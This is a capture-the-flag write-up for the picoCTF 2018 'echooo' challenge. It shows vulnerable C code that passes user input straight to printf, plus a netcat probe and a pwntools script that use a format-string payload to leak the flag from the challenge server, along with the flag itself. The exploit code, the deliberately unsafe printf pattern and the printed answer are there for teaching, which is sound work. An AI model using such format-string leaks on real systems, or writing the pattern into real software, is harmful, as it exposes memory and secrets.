# echooo
Binary Exploitation, 300 points

## Description:
> This program prints any input you give it. Can you leak the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

## Solution:

It's pretty easy to spot the format string attack even without the program pointing us directly at it.
```c
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
```

To make things even easier, the stack contains a pointer to the flag (`char *flag_ptr`), and it's conveniently stored close to our buffer. 

According to IDA's stack analysis, the flag pointer is just 3 DWORDs apart from the buffer:
```
-000000000000009C var_9C          dd ?
-0000000000000098 flag_ptr        dd ?
-0000000000000094 var_94          dd ?
-0000000000000090 file            dd ?
-000000000000008C buf             db ?
```

So, if we find the location of the buffer, we can easily find the pointer to the flag using a simple calculation.

We can find the buffer by sending a payload starting with "AAAA" and searching for it:
```console
root@kali:/media/sf_CTFs/pico/echooo# echo "AAAA%11\$x" | nc 2018shell3.picoctf.com 46960
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> AAAA41414141
```

We found it at offset 11. If we go back 3 DWORDs and dereference that pointer as a string, we will get the flag.

Putting it all together:
```python
from pwn import *

r = remote("2018shell3.picoctf.com", 46960)

def send_payload(payload):
   log.debug("payload = %s" % repr(payload))
   r.sendline(payload)
   ret = r.recvuntil("> ")
   return ret

r.recvuntil("> ")
format_string = FmtStr(execute_fmt=send_payload)
log.info("Format string offset: {}".format(format_string.offset))

payload = "%" + str(format_string.offset - 3) + "$s"
log.info("Payload: {}".format(payload))
print send_payload(payload)
```

Output:
```console
root@kali:/media/sf_CTFs/pico/echooo# python exploit.py
[+] Opening connection to 2018shell3.picoctf.com on port 46960: Done
[*] Found format string offset: 11
[*] Format string offset: 11
[*] Payload: %8$s
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}

>
[*] Closed connection to 2018shell3.picoctf.com port 46960
```

The flag: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}